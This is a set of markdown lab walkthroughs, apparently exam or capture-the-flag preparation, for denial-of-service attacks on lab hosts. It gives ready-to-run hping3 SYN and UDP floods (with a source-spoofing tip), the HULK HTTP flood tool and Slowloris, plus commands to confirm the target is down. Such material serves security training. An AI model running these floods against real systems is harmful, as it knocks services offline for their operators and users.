# 09 DoS — full walkthroughs

---

## Walkthrough 1: "Perform a SYN flood against 10.10.10.30 port 80 and show it in Wireshark"

**Type:** layer-4 flood | **Difficulty:** easy | **Time:** 2–3 min

1. Start a capture in one terminal:
   ```bash
   sudo tcpdump -i eth0 -w syn.pcap host 10.10.10.30 and tcp port 80
   ```
2. Launch the flood in another:
   ```bash
   sudo hping3 -S --flood -V -p 80 10.10.10.30
   ```
3. Let it run ~15 seconds, then Ctrl-C both.
4. Verify the target is unresponsive:
   ```bash
   curl -I --max-time 3 http://10.10.10.30/
   ```
5. Open `syn.pcap` in Wireshark → filter:
   ```
   tcp.flags.syn == 1 and tcp.flags.ack == 0
   ```
   You'll see a wall of SYNs from your IP.
6. **Answer:** screenshot/count of SYNs (`Statistics → Capture File Properties`), or "target stopped responding at HH:MM".

**Gotcha:** spoofing source (`--rand-source`) may blackhole replies depending on the lab topology — start without it.

---

## Walkthrough 2: "Take down a lab web server with HULK"

**Type:** layer-7 flood | **Difficulty:** easy | **Time:** 3 min

1. Get HULK:
   ```bash
   git clone https://github.com/grafov/hulk.git
   cd hulk
   ```
2. Launch:
   ```bash
   python3 hulk.py http://10.10.10.30/
   ```
3. From another box, check:
   ```bash
   while true; do curl -o /dev/null -s -w "%{http_code} %{time_total}\n" http://10.10.10.30/; sleep 1; done
   ```
   You'll see `000` / timeouts once the server gives up.
4. **Answer:** confirmation that HTTP stopped responding (timestamp + HULK output showing request count).

---

## Walkthrough 3: "Use Slowloris to exhaust the lab Apache server on 10.10.10.30:80"

**Type:** slow-HTTP | **Difficulty:** easy | **Time:** 3–5 min

1. Install + run:
   ```bash
   pip3 install slowloris
   slowloris 10.10.10.30 -p 80 -s 500
   ```
2. Slowloris opens 500 sockets, sends partial headers, keeps them alive forever.
3. In another terminal, prove the server is full:
   ```bash
   curl -I --max-time 5 http://10.10.10.30/
   ```
   You'll get a timeout — all worker slots are consumed.
4. Stop with Ctrl-C; the server recovers in ~30s.
5. **Answer:** slowloris status line showing 500 sockets + timestamp target became unreachable.

**Why slowloris works on Apache and not nginx:** Apache pre-fork assigns one process per connection; nginx uses async event loops.

---

## Walkthrough 4: "Launch a UDP flood against the lab DNS server 10.10.10.53 on port 53"

**Type:** UDP amplification | **Difficulty:** easy | **Time:** 2 min

1. Start capture:
   ```bash
   sudo tcpdump -i eth0 -w udp.pcap host 10.10.10.53 and udp port 53
   ```
2. Fire:
   ```bash
   sudo hping3 --udp --flood -p 53 -d 500 10.10.10.53
   ```
3. From a third host, verify DNS is dead:
   ```bash
   dig @10.10.10.53 example.com +time=2 +tries=1
   ```
4. Ctrl-C. Open `udp.pcap`, filter `udp.port == 53`, observe the rate in `Statistics → I/O Graphs`.
5. **Answer:** packet rate + confirmation `dig` timed out.
